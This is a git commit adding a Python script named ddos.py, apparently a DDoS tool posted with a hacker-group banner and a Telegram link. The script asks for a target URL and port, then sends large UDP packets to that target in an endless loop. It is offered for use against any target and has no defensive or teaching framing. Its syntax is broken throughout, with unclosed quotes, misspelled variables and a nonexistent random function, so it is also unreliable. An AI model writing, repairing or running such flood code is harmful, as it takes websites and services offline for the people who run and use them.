acc2634821311b92adc1f0376961aece8775df26
gkvai1998 <hasanjamil898@gmail.com>
2024-12-05 23:13:26 +0300

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,50 @@
+import os
+import socket
+import time 
+import random
+
+os.system("clear")
+
+print("\n")
+print("""   ____                                  ___,                                    , __                         _                            _     
+  (|   \  o                             /   |              o                    /|/  \                       | |            |             | |    
+   |    |      ,_     _    __   _|_    |    |    __   _|_       __    _  _       | __/  __,    _  _     __,  | |   __,    __|    _    ,   | |    
+  _|    | |   /  |   |/   /      |     |    |   /      |   |   /  \_ / |/ |      |   \ /  |   / |/ |   /  |  |/   /  |   /  |   |/   / \_ |/ \   
+ (/\___/  |_/    |_/ |__/ \___/  |_/    \__/\_/ \___/  |_/ |_/ \__/    |  |_/    |(__/ \_/|_/   |  |_/ \_/|/ |__/ \_/|_/ \_/|_/ |__/  \/  |   |_/
+                                                                                                         /|                                      
+                                                                                                         \|                                      """)
+                                                                                                         
+ print("\n)
+ 
+ print("\n)
+ print(" CODED BY TU-PADRE")
+ print("\n)
+ 
+ print("telegram: https://t.me/DirectActionBd")
+ print("\n")
+ 
+ time.sleep(3)
+ 
+ target_url= raw input(Target url: ")
+ print("[+]")
+ 
+ print("\n")
+ 
+time.sleep(3)
+ target_port- input(Target port: ")
+ print("[+]")
+ print("\n")
+ print("Attack starting... please wait.")
+ 
+ time.sleep(5)
+ 
+ bytes - random._unrandom(6000)
+ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ 
+ sayac = 0
+ 
+ while True:
+ 	sock.sendto(bytes,(target_url,target_port))
+     sayas = sayas + 1 
+     print(Attack started, sending packets: %s"%(sayas))
+     
